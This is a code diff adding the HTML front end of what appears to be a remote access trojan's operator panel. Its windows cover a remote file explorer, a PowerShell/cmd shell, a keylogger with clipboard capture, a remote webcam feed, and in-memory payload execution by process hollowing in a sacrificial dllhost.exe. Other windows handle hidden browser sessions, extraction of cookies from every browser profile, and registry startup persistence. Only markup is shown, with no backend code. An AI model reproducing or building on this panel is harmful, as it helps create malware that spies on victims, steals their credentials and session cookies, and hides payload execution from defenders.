+        <button class="w11-cb-btn" onclick="WE.triggerUpload()" title="Upload files here"><i class="fa-solid fa-arrow-up-from-bracket"></i> Upload</button>
+        <input id="w11-upload-input" type="file" multiple style="display:none" onchange="WE.uploadFiles(this.files)">
+        <button class="w11-cb-btn" id="w11-cb-zip" onclick="WE.compressZip()" disabled title="Compress to ZIP"><i class="fa-solid fa-file-zipper"></i> Zip</button>
+        <button class="w11-cb-btn" id="w11-cb-zipdl" onclick="WE.downloadZip()" disabled title="Download selection as ZIP (streamed)"><i class="fa-solid fa-file-arrow-down"></i> Get Zip</button>
+      </div>
+      <div class="w11-cb-sep"></div>
+      <div style="margin-left:auto;display:flex;align-items:center;gap:1px;flex-shrink:0">
+        <button class="w11-cb-btn" id="w11-btn-filter" onclick="WE.toggleDropdown('filter',this)" title="Filter by type"><i class="fa-solid fa-filter"></i> Filter <i class="fa-solid fa-chevron-down" style="font-size:8px;opacity:.6"></i></button>
+        <button class="w11-cb-btn" id="w11-btn-sort" onclick="WE.toggleDropdown('sort',this)" title="Sort by"><i class="fa-solid fa-arrow-down-wide-short"></i> Sort <i class="fa-solid fa-chevron-down" style="font-size:8px;opacity:.6"></i></button>
+        <button class="w11-cb-btn" id="w11-btn-view" onclick="WE.toggleDropdown('view',this)" title="View options"><i class="fa-solid fa-table-cells-large"></i> View <i class="fa-solid fa-chevron-down" style="font-size:8px;opacity:.6"></i></button>
+        <div class="w11-cb-sep"></div>
+        <button class="w11-cb-btn" id="w11-cb-preview" onclick="WE.togglePreview()" title="Preview pane (Alt+P)"><i class="fa-solid fa-table-columns"></i></button>
+      </div>
+    </div>
+
+    <!-- ── Body ── -->
+    <div class="w11-body">
+      <div class="w11-navpane" id="w11-navpane">
+        <div class="w11-np-section">Quick Access</div>
+        <div id="w11-np-qa"></div>
+        <div class="w11-np-section">This PC</div>
+        <div id="w11-np-drives"></div>
+      </div>
+      <div class="w11-mainpane" id="w11-mainpane">
+        <!-- Upload progress bar -->
+        <div class="w11-upload-bar-wrap" id="w11-upload-bar-wrap">
+          <div class="w11-upload-bar" id="w11-upload-bar"></div>
+        </div>
+        <div class="w11-col-header" id="w11-col-header">
+          <div class="w11-hdr-chk"><div class="w11-chk" id="w11-chk-all" onclick="WE.toggleSelectAll()" title="Select all"></div></div>
+          <div class="w11-col-h w11-col-h-name" data-sortkey="name">Name <i class="sort-ic fa-solid fa-sort" style="font-size:9px;opacity:.4"></i></div>
+          <div class="w11-col-h w11-col-h-date" data-sortkey="date">Date modified <i class="sort-ic fa-solid fa-sort" style="font-size:9px;opacity:.4"></i></div>
+          <div class="w11-col-h w11-col-h-type" data-sortkey="type">Type <i class="sort-ic fa-solid fa-sort" style="font-size:9px;opacity:.4"></i></div>
+          <div class="w11-col-h w11-col-h-size" data-sortkey="size">Size <i class="sort-ic fa-solid fa-sort" style="font-size:9px;opacity:.4"></i></div>
+        </div>
+        <div class="w11-filelist w11-details" id="w11-filelist"></div>
+        <div class="w11-drop-overlay" id="w11-drop-overlay">
+          <i class="fa-solid fa-file-arrow-up" style="font-size:28px"></i>
+          <span>Drop files to upload</span>
+        </div>
+        <div class="w11-fileviewer" id="w11-fileviewer">
+          <div class="w11-fv-header">
+            <span class="w11-fv-title"></span>
+            <button class="tbtn" id="w11-fv-edit" onclick="WE.fvToggleEdit()" style="display:none"><i class="fa-solid fa-pen"></i> Edit</button>
+            <button class="tbtn" id="w11-fv-save" onclick="WE.fvSave()" style="display:none"><i class="fa-solid fa-floppy-disk"></i> Save</button>
+            <button class="tbtn" onclick="WE.fvDownload()"><i class="fa-solid fa-download"></i> Download</button>
+            <button class="tbtn" onclick="WE.closeViewer()"><i class="fa-solid fa-xmark"></i></button>
+          </div>
+          <div class="w11-fv-body"></div>
+        </div>
+      </div>
+      <div class="w11-preview-pane w11-pv-hidden" id="w11-preview-pane">
+        <div class="w11-pv-resize" id="w11-pv-resize"></div>
+        <div class="w11-pv-content">
+          <div class="w11-pv-media" id="w11-pv-media">
+            <div class="w11-pv-empty"><i class="fa-regular fa-image"></i><span>Select a file to preview</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="w11-statusbar" id="w11-statusbar"><span>0 items</span><span></span></div>
+  </div>
+</div>
+
+<!-- Dropdown menus (outside modal for z-index) -->
+<div class="w11-dropdown" id="w11-dd-bc" style="min-width:160px"></div>
+<div class="w11-dropdown" id="w11-dd-new">
+  <div class="w11-dd-item" onclick="WE.newFolder();WE.closeDropdowns()"><i class="fa-solid fa-folder-plus" style="color:#eab308"></i>Folder</div>
+  <div class="w11-dd-sep"></div>
+  <div class="w11-dd-item" onclick="WE.newTextFile();WE.closeDropdowns()"><i class="fa-regular fa-file" style="color:#60a5fa"></i>Text Document</div>
+</div>
+<div class="w11-dropdown" id="w11-dd-sort">
+  <div class="w11-dd-label">Sort by</div>
+  <div class="w11-dd-item checked" data-sort="name"  onclick="WE.sortBy('name')"><i class="fa-solid fa-font"></i>Name<i class="fa-solid fa-check w11-check"></i></div>
+  <div class="w11-dd-item"         data-sort="date"  onclick="WE.sortBy('date')"><i class="fa-regular fa-calendar"></i>Date modified<i class="fa-solid fa-check w11-check"></i></div>
+  <div class="w11-dd-item"         data-sort="type"  onclick="WE.sortBy('type')"><i class="fa-solid fa-tag"></i>Type<i class="fa-solid fa-check w11-check"></i></div>
+  <div class="w11-dd-item"         data-sort="size"  onclick="WE.sortBy('size')"><i class="fa-solid fa-weight-hanging"></i>Size<i class="fa-solid fa-check w11-check"></i></div>
+  <div class="w11-dd-sep"></div>
+  <div class="w11-dd-label">Direction</div>
+  <div class="w11-dd-item checked" data-sortdir="asc"  onclick="WE.sortDir(true)"><i class="fa-solid fa-arrow-up-a-z"></i>Ascending<i class="fa-solid fa-check w11-check"></i></div>
+  <div class="w11-dd-item"         data-sortdir="desc" onclick="WE.sortDir(false)"><i class="fa-solid fa-arrow-down-a-z"></i>Descending<i class="fa-solid fa-check w11-check"></i></div>
+</div>
+<div class="w11-dropdown" id="w11-dd-view" style="min-width:170px">
+  <div class="w11-dd-label">Layout</div>
+  <div class="w11-dd-item"         data-view="details" onclick="WE.setViewMode('details');WE.closeDropdowns()"><i class="fa-solid fa-list-ul"></i>Details<i class="fa-solid fa-check w11-check"></i></div>
+  <div class="w11-dd-item"         data-view="compact" onclick="WE.setViewMode('compact');WE.closeDropdowns()"><i class="fa-solid fa-bars"></i>Compact<i class="fa-solid fa-check w11-check"></i></div>
+  <div class="w11-dd-item"         data-view="list"    onclick="WE.setViewMode('list');WE.closeDropdowns()"><i class="fa-solid fa-grip-lines"></i>List<i class="fa-solid fa-check w11-check"></i></div>
+  <div class="w11-dd-item"         data-view="medium"  onclick="WE.setViewMode('medium');WE.closeDropdowns()"><i class="fa-solid fa-table-cells"></i>Medium icons<i class="fa-solid fa-check w11-check"></i></div>
+  <div class="w11-dd-item checked" data-view="large"   onclick="WE.setViewMode('large');WE.closeDropdowns()"><i class="fa-solid fa-table-cells-large"></i>Large icons<i class="fa-solid fa-check w11-check"></i></div>
+  <div class="w11-dd-item"         data-view="gallery" onclick="WE.setViewMode('gallery');WE.closeDropdowns()"><i class="fa-solid fa-image"></i>Gallery<i class="fa-solid fa-check w11-check"></i></div>
+  <div class="w11-dd-sep"></div>
+  <div class="w11-dd-item" id="w11-dd-hidden" onclick="WE.toggleHiddenFiles()"><i class="fa-solid fa-eye"></i>Hidden items<i class="fa-solid fa-check w11-check"></i></div>
+</div>
+<div class="w11-dropdown" id="w11-dd-filter" style="min-width:170px">
+  <div class="w11-dd-label">Filter by type</div>
+  <div class="w11-dd-item checked" data-typefilter="all"       onclick="WE.setTypeFilter('all')"     ><i class="fa-solid fa-border-all" style="color:#888"></i>All<i class="fa-solid fa-check w11-check"></i></div>
+  <div class="w11-dd-item"         data-typefilter="folders"   onclick="WE.setTypeFilter('folders')" ><i class="fa-solid fa-folder" style="color:#eab308"></i>Folders<i class="fa-solid fa-check w11-check"></i></div>
+  <div class="w11-dd-item"         data-typefilter="documents" onclick="WE.setTypeFilter('documents')"><i class="fa-solid fa-file-lines" style="color:#60a5fa"></i>Documents<i class="fa-solid fa-check w11-check"></i></div>
+  <div class="w11-dd-item"         data-typefilter="images"    onclick="WE.setTypeFilter('images')"  ><i class="fa-solid fa-image" style="color:#c084fc"></i>Images<i class="fa-solid fa-check w11-check"></i></div>
+  <div class="w11-dd-item"         data-typefilter="videos"    onclick="WE.setTypeFilter('videos')"  ><i class="fa-solid fa-film" style="color:#f87171"></i>Videos<i class="fa-solid fa-check w11-check"></i></div>
+  <div class="w11-dd-item"         data-typefilter="audio"     onclick="WE.setTypeFilter('audio')"   ><i class="fa-solid fa-music" style="color:#34d399"></i>Audio<i class="fa-solid fa-check w11-check"></i></div>
+  <div class="w11-dd-item"         data-typefilter="archives"  onclick="WE.setTypeFilter('archives')"><i class="fa-solid fa-file-zipper" style="color:#fbbf24"></i>Archives<i class="fa-solid fa-check w11-check"></i></div>
+  <div class="w11-dd-item"         data-typefilter="code"      onclick="WE.setTypeFilter('code')"    ><i class="fa-solid fa-code" style="color:#a3e635"></i>Code<i class="fa-solid fa-check w11-check"></i></div>
+</div>
+
+<!-- Context menu -->
+<div id="w11-ctx" style="position:fixed;display:none;z-index:9999;background:#2b2b2b;border:1px solid rgba(255,255,255,.1);border-radius:8px;padding:4px;min-width:200px;box-shadow:0 8px 32px rgba(0,0,0,.7);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px)"></div>
+
+<!-- Properties dialog -->
+<div id="w11-props-backdrop">
+  <div id="w11-props-box">
+    <div class="w11-props-title"><span id="w11-props-title-text">Properties</span><button class="w11-props-close" onclick="WE.closeProperties()"><i class="fa-solid fa-xmark"></i></button></div>
+    <div class="w11-props-header"><div class="w11-props-icon" id="w11-props-icon"></div><div><div class="w11-props-name" id="w11-props-name"></div><div class="w11-props-ext" id="w11-props-ext"></div></div></div>
+    <div class="w11-props-body" id="w11-props-body"></div>
+    <div class="w11-props-actions"><button class="tbtn" onclick="WE.closeProperties()">Close</button></div>
+  </div>
+</div>
+
+<!-- Toast container -->
+<div id="w11-toast"></div>
+
+<div class="fp-modal" id="fp-term" style="width:720px;height:520px">
+  <div class="modal-content wt-modal">
+    <div class="wt-titlebar" id="fph-term">
+      <div class="wt-tabs">
+        <div class="wt-tab active" id="term-tab-ps" onclick="termShellTab('ps')">
+          <i class="fa-solid fa-terminal wt-tab-ico"></i>
+          <span class="wt-tab-label" id="term-tab-title">PowerShell</span>
+        </div>
+        <div class="wt-tab" id="term-tab-cmd" onclick="termShellTab('cmd')">
+          <i class="fa-solid fa-terminal wt-tab-ico" style="color:#c19c00"></i>
+          <span class="wt-tab-label">cmd</span>
+        </div>
+      </div>
+      <div class="wt-actions">
+        <span id="term-stat" class="wt-stat off" title="Connection"><i class="fa-solid fa-circle" style="font-size:7px"></i></span>
+        <button class="wt-act-btn" onclick="termFindToggle()" title="Find in output (Ctrl+F)"><i class="fa-solid fa-magnifying-glass"></i></button>
+        <button class="wt-act-btn" onclick="termCopyAll()" title="Copy all output"><i class="fa-regular fa-copy"></i></button>
+        <button class="wt-act-btn" onclick="termClear()" title="Clear"><i class="fa-solid fa-eraser"></i></button>
+        <button class="wt-act-btn" onclick="termReconnect()" title="Restart shell (reconnect)"><i class="fa-solid fa-rotate-right"></i></button>
+        <button class="wt-act-btn wt-close-btn" onclick="fpClose('term')"><i class="fa-solid fa-xmark"></i></button>
+      </div>
+    </div>
+    <div id="term-findbar">
+      <i class="fa-solid fa-magnifying-glass"></i>
+      <input id="term-find-input" type="text" placeholder="Find in output (Enter, Esc clears)" autocomplete="off" spellcheck="false">
+    </div>
+    <div id="term-out" tabindex="0"></div>
+  </div>
+</div>
+
+<div class="fp-modal" id="fp-keys" style="width:620px;height:480px">
+  <div class="modal-content w11-exp">
+    <div class="modal-header w11-titlebar" id="fph-keys">
+      <div class="w11-tb-left">
+        <i class="fa-solid fa-keyboard w11-tb-icon" style="color:#4ade80"></i>
+        <span class="w11-tb-title">Keylogger</span>
+      </div>
+      <div class="w11-tb-right">
+        <button class="w11-tb-btn w11-tb-close" onclick="fpClose('keys')" title="Close"><i class="fa-solid fa-xmark"></i></button>
+      </div>
+    </div>
+    <div class="kl-toolbar">
+      <button class="kl-tab active" id="kl-tab-keys" onclick="klTab('keys')"><i class="fa-solid fa-keyboard"></i> Keylogger</button>
+      <button class="kl-tab" id="kl-tab-clip" onclick="klTab('clip')"><i class="fa-regular fa-clipboard"></i> Clipboard</button>
+      <input id="kl-search" type="search" placeholder="Filter…" oninput="klRenderCached()" title="Filter keys">
+      <select id="kl-app" onchange="klRenderCached()" title="Group by app"><option value="">All apps</option></select>
+      <div class="kl-spacer"></div>
+      <button class="kl-btn" id="kl-pause-btn" onclick="klTogglePause()" title="Pause live refresh"><i class="fa-solid fa-pause"></i></button>
+      <button class="kl-btn" onclick="klCopy()" title="Copy log to clipboard"><i class="fa-regular fa-copy"></i></button>
+      <button class="kl-btn" onclick="klClear()" title="Clear log"><i class="fa-regular fa-trash-can"></i></button>
+    </div>
+    <div class="kl-body" id="kl-body"><div class="kl-empty">No keylogs recorded yet</div></div>
+  </div>
+</div>
+
+<div class="fp-modal" id="fp-proc" style="width:660px;height:530px">
+  <div class="modal-content tm11-modal">
+    <div class="modal-header tm11-titlebar" id="fph-proc">
+      <div class="tm11-title-wrap">
+        <i class="fa-solid fa-gauge-high" style="color:#0078d4;font-size:13px"></i>
+        <span class="tm11-title-text">Task Manager</span>
+      </div>
+      <button class="close-modal" onclick="fpClose('proc')"><i class="fa-solid fa-xmark"></i></button>
+    </div>
+    <div class="tm11-tabs">
+      <div class="tm11-tab tm11-tab-active" id="tm11-tab-proc" onclick="tmProcTab('proc')"><i class="fa-solid fa-list" style="font-size:12px"></i> Processes</div>
+      <div class="tm11-tab" id="tm11-tab-gpu" onclick="tmProcTab('gpu')"><i class="fa-solid fa-microchip" style="font-size:12px"></i> GPU</div>
+      <div class="tm11-tab" id="tm11-tab-svc" onclick="tmProcTab('svc')"><i class="fa-solid fa-gears" style="font-size:12px"></i> Services</div>
+    </div>
+    <!-- Process panel (shown by default; hidden when GPU tab clicked) -->
+    <div id="tm11-proc-panel" style="display:flex; flex:1; flex-direction:column; min-height:0;">
+      <div class="tm11-toolbar">
+        <div class="tm11-search-box">
+          <i class="fa-solid fa-magnifying-glass tm11-search-ico"></i>
+          <input type="search" id="proc-search" class="tm11-search" placeholder="Search by name or PID…" oninput="filterProcs()">
+        </div>
+        <button class="tm11-refresh-btn" id="tm11-refresh-proc" onclick="loadProcs()"><i class="fa-solid fa-rotate-right"></i> Refresh</button>
+      </div>
+      <div class="tm11-thead">
+        <div class="tm11-th tm11-th-name" onclick="sortProcs('name')">Name<span id="tm11-si-name" style="opacity:.6;font-size:9px"></span></div>
+        <div class="tm11-th tm11-th-pid"  onclick="sortProcs('pid')">PID<span id="tm11-si-pid" style="opacity:.6;font-size:9px"></span></div>
+        <div class="tm11-th tm11-th-cpu"  onclick="sortProcs('cpu')">CPU<span id="tm11-si-cpu" style="opacity:.6;font-size:9px"></span></div>
+        <div class="tm11-th tm11-th-mem"  onclick="sortProcs('mem')">Memory<span id="tm11-si-mem" style="opacity:.6;font-size:9px"></span></div>
+        <div class="tm11-th tm11-th-act"></div>
+      </div>
+      <div id="proc-tbl-wrap" class="tm11-list"></div>
+      <div id="proc-count" class="tm11-statusbar">—</div>
+    </div>
+
+    <!-- GPU panel (hidden by default; shown when GPU tab clicked) -->
+    <div id="tm11-gpu-panel" style="display:none; flex:1; flex-direction:column; min-height:0;">
+      <div class="tm11-gpu-hero">
+        <div class="tm11-gpu-ring" id="gpu-ring">
+          <div class="tm11-gpu-ring-val" id="gpu-ring-val">0%</div>
+        </div>
+        <div class="tm11-gpu-hero-info">
+          <div class="tm11-gpu-hero-title"><i class="fa-solid fa-microchip"></i> Total GPU Utilization</div>
+          <div class="tm11-gpu-hero-sub" id="gpu-hero-sub">Sampling GPU engines…</div>
+        </div>
+        <button class="tm11-refresh-btn" onclick="loadGpu()"><i class="fa-solid fa-rotate-right"></i> Refresh</button>
+      </div>
+      <div class="tm11-thead">
+        <div class="tm11-th tm11-th-name" onclick="sortGpu('name')">Name<span id="tm11-si-gname" style="opacity:.6;font-size:9px"></span></div>
+        <div class="tm11-th tm11-th-pid"  onclick="sortGpu('pid')">PID<span id="tm11-si-gpid" style="opacity:.6;font-size:9px"></span></div>
+        <div class="tm11-th tm11-gpu-th-gpu" onclick="sortGpu('gpu')">GPU<span id="tm11-si-ggpu" style="opacity:.6;font-size:9px"></span></div>
+        <div class="tm11-th tm11-gpu-th-eng">Engines</div>
+      </div>
+      <div id="gpu-tbl-wrap" class="tm11-list"></div>
+      <div id="gpu-count" class="tm11-statusbar">—</div>
+    </div>
+
+    <!-- Services panel (hidden by default; shown when Services tab clicked) -->
+    <div id="tm11-svc-panel" style="display:none; flex:1; flex-direction:column; min-height:0;">
+      <div class="tm11-toolbar">
+        <div class="tm11-search-box">
+          <i class="fa-solid fa-magnifying-glass tm11-search-ico"></i>
+          <input type="search" id="svc-search" class="tm11-search" placeholder="Search by name or display name…" oninput="svcRender()">
+        </div>
+        <button class="tm11-refresh-btn" onclick="svcLoad()"><i class="fa-solid fa-rotate-right"></i> Refresh</button>
+      </div>
+      <div class="tm11-thead">
+        <div class="tm11-th" style="width:170px">Service</div>
+        <div class="tm11-th" style="flex:1">Display Name</div>
+        <div class="tm11-th" style="width:86px">State</div>
+        <div class="tm11-th" style="width:104px">Start Type</div>
+        <div class="tm11-th" style="width:56px">PID</div>
+        <div class="tm11-th" style="width:238px"></div>
+      </div>
+      <div id="svc-tbl-wrap" class="tm11-list"></div>
+      <div id="svc-count" class="tm11-statusbar">—</div>
+    </div>
+  </div>
+</div>
+
+<div class="fp-modal" id="fp-cam" style="width:500px;height:440px">
+  <div class="modal-content cam-modal">
+    <div class="cam-titlebar" id="fph-cam">
+      <div class="cam-title-left">
+        <i class="fa-solid fa-camera cam-title-ico"></i>
+        <span class="cam-title-text">Camera</span>
+      </div>
+      <button class="cam-title-close" onclick="fpClose('cam')"><i class="fa-solid fa-xmark"></i></button>
+    </div>
+    <div id="cam-video-wrap">
+      <div id="cam-placeholder">
+        <i class="fa-solid fa-camera"></i>
+        <span>No camera feed active</span>
+      </div>
+      <canvas id="cam-canvas"></canvas>
+    </div>
+    <div class="cam-controls">
+      <select id="cam-select" class="cam-select">
+        <option value="">Select camera…</option>
+      </select>
+      <button class="cam-btn" onclick="scanCams()"><i class="fa-solid fa-rotate-right"></i> Scan</button>
+      <button class="cam-btn cam-btn-start" onclick="connectSelectedCam()"><i class="fa-solid fa-circle-play"></i> Start</button>
+      <button class="cam-btn cam-btn-stop" onclick="stopCam()"><i class="fa-solid fa-stop"></i> Stop</button>
+    </div>
+    <div id="cam-status-bar">Scan to detect remote cameras</div>
+  </div>
+</div>
+
+<div class="fp-modal" id="fp-mem" style="width:640px;height:580px">
+  <div class="modal-content mem-modal">
+    <div class="modal-header mem-titlebar" id="fph-mem">
+      <div class="mem-title-left">
+        <i class="fa-solid fa-memory mem-title-ico"></i>
+        <span class="mem-title-text">Run to Memory</span>
+      </div>
+      <button class="mem-title-close" onclick="fpClose('mem')" title="Close"><i class="fa-solid fa-xmark"></i></button>
+    </div>
+    <div class="mem-body">
+      <div class="mem-form">
+        <span class="mem-label">Payload (PE / .exe)</span>
+        <div class="mem-file-row">
+          <button class="tbtn mem-file-btn" type="button" onclick="document.getElementById('mem-file-input').click()">
+            <i class="fa-solid fa-file-arrow-up"></i> Choose file
+          </button>
+          <input id="mem-file-input" type="file" style="display:none" onchange="memUpdateFile(this)">
+          <span class="mem-file-name" id="mem-file-name">No file selected</span>
+        </div>
+
+        <span class="mem-label">Arguments</span>
+        <input id="mem-args" class="mem-input" type="text" placeholder="-t 1" autocomplete="off" spellcheck="false">
+
+        <details class="mem-advanced">
+          <summary>Advanced</summary>
+          <span class="mem-label">Memory loader</span>
+          <select id="mem-loader" class="mem-input">
+            <option value="new">New — alias image path + std handles (v2 payloads)</option>
+            <option value="legacy">Legacy — classic behavior (pre-v2 payloads)</option>
+          </select>
+          <span class="mem-label" style="margin-top:8px">Sacrificial host process</span>
+          <input id="mem-host" class="mem-input" type="text" value="C:\Windows\System32\dllhost.exe" autocomplete="off" spellcheck="false">
+          <span class="mem-hint" style="margin-top:6px">Use a classic Win32 host. Packaged/AppModel hosts (notepad.exe, msedge.exe, calc.exe) take over the process on Win11 22H2+ and open the real app instead.</span>
+        </details>
+
+        <div class="mem-actions">
+          <span class="mem-hint">Payload runs entirely in RAM via process hollowing. Output is captured from stdout/stderr.</span>
+          <button id="mem-stop-btn" class="mem-btn-stop" type="button" onclick="memStop()" disabled title="Kill the spawned process">
+            <i class="fa-solid fa-stop"></i> Stop
+          </button>
+          <button id="mem-run-btn" class="mem-btn-run" type="button" onclick="memRun()">
+            <i class="fa-solid fa-play"></i> Run
+          </button>
+        </div>
+      </div>
+
+      <div class="mem-output-wrap">
+        <div class="mem-output-head">
+          <span class="mem-output-title">Output</span>
+          <span class="mem-output-status" id="mem-output-status">Idle</span>
+          <button class="tbtn" type="button" onclick="memCopyOutput()"><i class="fa-solid fa-copy"></i> Copy</button>
+          <button class="tbtn" type="button" onclick="memClearOutput()"><i class="fa-solid fa-eraser"></i> Clear</button>
+        </div>
+        <pre class="mem-output" id="mem-output"></pre>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ── Hidden Browsers ── -->
+<div class="fp-modal" id="fp-bot" style="width:640px;height:700px">
+  <div class="modal-content mem-modal">
+    <div class="modal-header mem-titlebar" id="fph-bot">
+      <div class="mem-title-left">
+        <i class="fa-solid fa-eye-slash mem-title-ico"></i>
+        <span class="mem-title-text">Hidden Browsers</span>
+      </div>
+      <button class="mem-title-close" onclick="fpClose('bot')" title="Close"><i class="fa-solid fa-xmark"></i></button>
+    </div>
+    <div class="mem-body" style="display:flex;flex-direction:column;gap:14px;overflow-y:auto;padding:14px 18px">
+      <div>
+        <div class="bot-section-head">
+          <span class="mem-label"><i class="fa-solid fa-window-restore"></i> Sessions</span>
+          <button class="tbtn" type="button" onclick="botLoadSessions()" title="Refresh"><i class="fa-solid fa-rotate-right"></i></button>
+        </div>
+        <div id="bot-sess-list" style="display:flex;flex-direction:column;gap:6px"></div>
+        <div style="margin-top:8px">
+          <button class="mem-btn-run" type="button" style="width:100%" onclick="botStartSession()">
+            <i class="fa-solid fa-plus"></i> New hidden browser
+          </button>
+        </div>
+      </div>
+      <div class="bot-section" id="bot-new-sess">
+        <div class="bot-section-head">
+          <span class="mem-label"><i class="fa-solid fa-cookie-bite"></i> Browser cookies</span>
+          <button id="bot-dump-btn" class="tbtn" type="button" onclick="botDumpCookies()" title="Extract cookies from every browser profile on this machine">
+            <i class="fa-solid fa-magnifying-glass"></i> Scan
+          </button>
+        </div>
+        <div id="bot-dump-list"></div>
+      </div>
+      <div class="bot-section" id="bot-vault-sect">
+        <div class="bot-section-head">
+          <span class="mem-label"><i class="fa-solid fa-vault"></i> Cookie vault</span>
+          <span style="display:flex;gap:4px">
+            <button class="tbtn" type="button" title="Import a cookies file (JSON or Netscape) into the vault" onclick="document.getElementById('bot-vault-import').click()"><i class="fa-solid fa-file-import"></i></button>
+            <input type="file" id="bot-vault-import" accept=".json,.txt" style="display:none" onchange="botVaultImportFile(this)">
+          </span>
+        </div>
+        <div id="bot-vault-list"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="fp-modal" id="fp-url" style="width:460px;height:300px">
+  <div class="modal-content mem-modal">
+    <div class="modal-header mem-titlebar" id="fph-url">
+      <div class="mem-title-left">
+        <i class="fa-solid fa-globe mem-title-ico"></i>
+        <span class="mem-title-text">Open URL</span>
+      </div>
+      <button class="mem-title-close" onclick="fpClose('url')" title="Close"><i class="fa-solid fa-xmark"></i></button>
+    </div>
+    <div class="mem-body">
+      <div class="mem-form">
+        <span class="mem-label">URL</span>
+        <input id="url-modal-input" class="mem-input" type="text" placeholder="example.com" autocomplete="off" spellcheck="false" onkeydown="if(event.key==='Enter')openURL()">
+
+        <span class="mem-label">Settings</span>
+        <label class="url-opt"><input type="checkbox" id="url-opt-hidden"> <span>Open in background (hidden window)</span></label>
+        <label class="url-opt"><input type="checkbox" id="url-opt-remember" checked> <span>Remember last URL</span></label>
+
+        <div class="mem-actions">
+          <span class="mem-hint">Opens in the default browser on the remote machine. https:// is added automatically if missing.</span>
+          <button id="url-open-btn" class="mem-btn-run" type="button" onclick="openURL()">
+            <i class="fa-solid fa-arrow-up-right-from-square"></i> Open
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="fp-modal" id="fp-sysinfo" style="width:640px;height:600px">
+  <div class="modal-content mem-modal">
+    <div class="modal-header mem-titlebar" id="fph-sysinfo">
+      <div class="mem-title-left">
+        <i class="fa-solid fa-circle-info mem-title-ico"></i>
+        <span class="mem-title-text">System Info</span>
+      </div>
+      <button class="mem-title-close" onclick="fpClose('sysinfo')" title="Close"><i class="fa-solid fa-xmark"></i></button>
+    </div>
+    <div class="si-grid" id="si-grid"><div class="si-loading">Loading…</div></div>
+  </div>
+</div>
+
+<div class="fp-modal" id="fp-startup" style="width:900px;height:540px">
+  <div class="modal-content mem-modal">
+    <div class="modal-header mem-titlebar" id="fph-startup">
+      <div class="mem-title-left">
+        <i class="fa-solid fa-rocket mem-title-ico"></i>
+        <span class="mem-title-text">Startup Manager</span>
+      </div>
+      <button class="mem-title-close" onclick="fpClose('startup')" title="Close"><i class="fa-solid fa-xmark"></i></button>
+    </div>
+    <div class="sxt-toolbar">
+      <div class="sxt-search">
+        <i class="fa-solid fa-magnifying-glass"></i>
+        <input type="search" id="startup-search" placeholder="Filter by name, command or source…" oninput="startupRender()">
+      </div>
+      <button class="sxt-refresh" onclick="startupLoad()"><i class="fa-solid fa-rotate-right"></i> Refresh</button>
+<button class="sxt-refresh" onclick="startupAdd()" title="Add a new startup entry"><i class="fa-solid fa-plus"></i> Add</button>
+    </div>
+    <div class="sxt-list" id="startup-list"><div class="sxt-empty">Loading…</div></div>
+    <div class="sxt-statusbar" id="startup-status">—</div>
+  </div>
+</div>
+
+<div class="fp-modal" id="fp-startup-edit" style="width:560px;height:380px">
+  <div class="modal-content mem-modal">
+    <div class="modal-header mem-titlebar" id="fph-startup-edit">
+      <div class="mem-title-left">
+        <i class="fa-solid fa-pen-to-square mem-title-ico"></i>
+        <span class="mem-title-text">Edit Startup Entry</span>
+      </div>
+      <button class="mem-title-close" onclick="fpClose('startup-edit')" title="Close"><i class="fa-solid fa-xmark"></i></button>
+    </div>
+    <div class="mem-body">
+      <div class="mem-form">
+        <span class="mem-label">Source</span>
+        <input id="ste-source" class="mem-input" type="text" readonly style="opacity:.6;cursor:default">
+
+        <span class="mem-label">Name</span>
+        <input id="ste-name" class="mem-input" type="text" autocomplete="off" spellcheck="false">
+
+        <span class="mem-label" id="ste-cmd-label">Command</span>
+        <input id="ste-cmd" class="mem-input" type="text" autocomplete="off" spellcheck="false">
+
+        <div class="mem-actions">
+          <span class="mem-hint" id="ste-hint">Changes are written to the registry immediately.</span>
+          <button class="mem-btn-run" type="button" onclick="startupSaveEdit()">
+            <i class="fa-solid fa-floppy-disk"></i> Save
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="fp-modal" id="fp-tcp" style="width:940px;height:560px">
+  <div class="modal-content mem-modal">
+    <div class="modal-header mem-titlebar" id="fph-tcp">
+      <div class="mem-title-left">
+        <i class="fa-solid fa-network-wired mem-title-ico"></i>
+        <span class="mem-title-text">TCP Manager</span>
+      </div>
+      <button class="mem-title-close" onclick="fpClose('tcp')" title="Close"><i class="fa-solid fa-xmark"></i></button>
+    </div>
+    <div class="sxt-toolbar">
+      <div class="sxt-search">
+        <i class="fa-solid fa-magnifying-glass"></i>
+        <input type="search" id="tcp-search" placeholder="Filter by process, address, port or state…" oninput="tcpRender()">
+      </div>
+      <button class="sxt-refresh" onclick="tcpLoad()"><i class="fa-solid fa-rotate-right"></i> Refresh</button>
+    </div>
+    <div class="sxt-head">
+      <span class="sxt-th tcp-proc">Process</span>
+      <span class="sxt-th tcp-laddr">Local Addr</span>
+      <span class="sxt-th tcp-lport">Local Port</span>
+      <span class="sxt-th tcp-raddr">Remote Addr</span>
+      <span class="sxt-th tcp-rport">Remote Port</span>
+      <span class="sxt-th tcp-state">State</span>
+<span class="sxt-th tcp-act"></span>
+    </div>
+    <div class="sxt-list" id="tcp-list"><div class="sxt-empty">Loading…</div></div>
+    <div class="sxt-statusbar" id="tcp-status">—</div>
+  </div>
+</div>
+
+<div class="fp-modal" id="fp-ports" style="width:760px;height:540px">
+  <div class="modal-content mem-modal">
+    <div class="modal-header mem-titlebar" id="fph-ports">
+      <div class="mem-title-left">
+        <i class="fa-solid fa-plug-circle-bolt mem-title-ico"></i>
+        <span class="mem-title-text">Listening Ports</span>
+      </div>
+      <button class="mem-title-close" onclick="fpClose('ports')" title="Close"><i class="fa-solid fa-xmark"></i></button>
+    </div>
+    <div class="sxt-toolbar">
+      <div class="sxt-search">
+        <i class="fa-solid fa-magnifying-glass"></i>
+        <input type="search" id="ports-search" placeholder="Filter by process, address, port or protocol…" oninput="portsRender()">
+      </div>
+      <button class="sxt-refresh" onclick="portsLoad()"><i class="fa-solid fa-rotate-right"></i> Refresh</button>
+    </div>
+    <div class="sxt-head">
+      <span class="sxt-th pt-proc">Process</span>
+      <span class="sxt-th pt-proto">Proto</span>
+      <span class="sxt-th pt-addr">Bind Addr</span>
+      <span class="sxt-th pt-port">Port</span>
+    </div>
